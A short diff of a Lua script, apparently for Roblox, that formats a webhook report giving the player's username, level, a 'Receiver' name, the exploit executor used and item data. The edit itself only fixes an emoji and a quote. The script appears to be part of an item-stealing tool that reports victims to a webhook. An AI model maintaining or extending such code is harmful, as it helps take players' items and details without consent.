@@ -1067,7 +1067,7 @@ local WebHookEmbed = CreateEmbed(
         {
             name = ":ocean: Player Info", 
             value = "``` | 📖 Username: "..LP.Name.."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n :robot: Receiver: "..UserName.."\n | 💻 Executor Used: "..identifyexecutor()..""```"
+                     "\n | 🥳 Receiver: "..UserName.."\n | 💻 Executor Used: "..identifyexecutor().."```"
         },
         {
             name = ":apple: Items Data", 
